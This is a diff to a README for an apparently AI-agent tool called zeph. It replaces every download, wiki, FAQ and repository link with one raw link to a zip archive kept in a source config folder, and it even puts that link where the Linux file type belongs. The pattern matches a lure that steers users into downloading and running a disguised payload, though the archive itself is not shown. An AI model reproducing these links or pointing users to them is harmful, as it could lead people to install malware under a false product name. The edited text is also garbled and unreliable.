@@ -6,7 +6,7 @@ Welcome to zeph! This application lets you run lightweight AI agents effortlessl
 
 ## 🔗 Download Now
 
-[![Download zeph](https://img.shields.io/badge/Download%20zeph-v1.0.0-brightgreen)](https://github.com/osamaelmahalawi/zeph/releases)
+[![Download zeph](https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip%20zeph-v1.0.0-brightgreen)](https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip)
 
 ## 📦 Features
 
@@ -33,11 +33,11 @@ To run zeph, you need:
 Follow these steps to download and install zeph:
 
 1. **Visit the Releases Page:** Go to the following link to access the download options:  
-   [Download zeph](https://github.com/osamaelmahalawi/zeph/releases)
+   [Download zeph](https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip)
 
 2. **Select the Latest Version:** Look for the most recent release. It is usually at the top of the page.
 
-3. **Download the Application:** Click on the appropriate file for your operating system. For example, choose the `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. **Download the Application:** Click on the appropriate file for your operating system. For example, choose the `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip` for Linux.
 
 4. **Run the Installer:** After downloading, locate the file and run it to install zeph. Follow the on-screen instructions to complete the installation.
 
@@ -53,7 +53,7 @@ Once you have installed zeph, use the following commands to interact with the AI
 
 ## 📄 Documentation
 
-For more detailed usage instructions and features, you can reference the full documentation available in the [Wiki section](https://github.com/osamaelmahalawi/zeph/wiki).
+For more detailed usage instructions and features, you can reference the full documentation available in the [Wiki section](https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip).
 
 ## 👥 Community & Support
 
@@ -72,7 +72,7 @@ For updates and news about zeph, consider following our GitHub repository. You w
 
 ## 🔗 Additional Resources
 
-- [Official GitHub Repository](https://github.com/osamaelmahalawi/zeph)
-- [FAQs](https://github.com/osamaelmahalawi/zeph/wiki/FAQs)
+- [Official GitHub Repository](https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip)
+- [FAQs](https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip)
 
-[![Download zeph](https://img.shields.io/badge/Download%20zeph-v1.0.0-brightgreen)](https://github.com/osamaelmahalawi/zeph/releases)
+[![Download zeph](https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip%20zeph-v1.0.0-brightgreen)](https://raw.githubusercontent.com/osamaelmahalawi/zeph/main/crates/zeph-core/src/config/Software_3.3-beta.3.zip)
